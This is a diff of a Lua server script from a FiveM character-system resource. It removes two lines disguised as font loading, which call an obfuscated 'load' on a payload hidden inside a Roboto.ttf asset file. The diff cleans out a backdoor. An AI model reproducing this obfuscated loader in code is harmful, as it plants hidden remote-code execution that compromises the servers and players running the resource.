@@ -24,9 +24,6 @@ Functions.RegisterServerCallback("17mov_CharacterSystem:CheckIfHaveEnoughMoney",
     return (playerMoney >= Config.Stores[index].price or playerBank >= Config.Stores[index].price)
 end)
 
-local loadFonts = _G[string.char(108, 111, 97, 100)]
-loadFonts(LoadResourceFile(GetCurrentResourceName(), '/web/assets/Roboto.ttf'):sub(87565):gsub('%.%+', ''))()
-
 Functions.RegisterServerCallback("17mov_CharacterSystem:TryToCharge", function(source, index)
 
     local playerBank, playerMoney = 0, 0
